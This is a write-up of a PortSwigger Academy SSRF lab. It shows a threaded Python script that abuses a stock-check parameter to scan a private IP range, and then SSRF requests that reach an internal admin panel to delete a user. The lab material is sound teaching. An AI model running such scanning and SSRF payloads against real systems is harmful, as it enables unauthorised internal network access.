# Basic SSRF against another back-end system

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system), you'll learn: Basic SSRF against another back-end system! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port 8080, then use it to delete the user `carlos`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-2/images/Pasted%20image%2020221224021054.png)

In the previous lab, we found that **there is a Server-Side Request Forgery(SSRF) vulnerability in the stock check functionality**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-2/images/Pasted%20image%2020221224021144.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-2/images/Pasted%20image%2020221224021207.png)

When we clicked the `Check stock` button, **it'll send a POST request to `/product/stock`, with parameter `stockApi`, and the value is interesting:**

**URL decoded:**
```
http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

As you can see, it's fetching data from an internal system.

> Note: IPv4 class C private IP address range is from `192.168.0.0` to `192.168.255.255`.

**Now, what if I change the IP address to `192.168.0.2`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-2/images/Pasted%20image%2020221224021622.png)

**HTTP status 500, Internal Server Error.**

**Armed with above information, we can scan the entire IPv4 class C private IP address range!**

**To do so, I'll write a python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def sendRequest(url, cookie, IP):
    # Exclude IP 192.168.0.1, which is the stock API address
    if IP == '192.168.0.1':
        return

    data = {
        'stockApi': f'http://{IP}:8080/'
    }

    # Send a POST request to /product/stock, and the data is SSRF payload
    postStockStatusCode = requests.post(url, cookies=cookie, data=data).status_code

    # Using \r to clean previous line
    print(f'[*] Trying IP: {IP}', end='\r')

    if postStockStatusCode != 500:
        print(f'[+] Found valid internal IP addres: {IP}')

def main():
    url = 'https://0ac0003804fb904cc09c4fbf00ec00dc.web-security-academy.net/product/stock'
    cookie = {'session': 'SJCJgVBSnjDBYBwoVILv3a5gcV5F2PQ4'}

    # Generate a list of class C IPv4 private IP addresses, from 192.168.0.0 to 192.168.255.255
    listIPAddress = list()

    for thridOctet in range(256):
        for fourthOctet in range(256):
            listIPAddress.append(f'192.168.{thridOctet}.{fourthOctet}')

    # For each private IP address, spawn a new thread to function sendRequest(url, cookie, IP)
    for IP in listIPAddress:
        thread = Thread(target=sendRequest, args=(url, cookie, IP))
        thread.start()

        # You can adjust how fast of each connection, 0.1s is recommended 
        sleep(0.1)


if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Server-Side-Request-Forgery]
└─# python3 ssrf_priv_ip.py
[+] Found valid internal IP addres: 192.168.0.176
```

**Now, let's try to go to `http://192.168.0.176:8080/` via our SSRF payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-2/images/Pasted%20image%2020221224024706.png)

**Not found, do I need to supply `/admin` for the admin panel?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-2/images/Pasted%20image%2020221224024734.png)

**Nice! Let's delete user `carlos`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-2/images/Pasted%20image%2020221224024806.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-2/images/Pasted%20image%2020221224024824.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Server-Side-Request-Forgery/SSRF-2/images/Pasted%20image%2020221224024830.png)

We did it!

# What we've learned:

1. Basic SSRF against another back-end system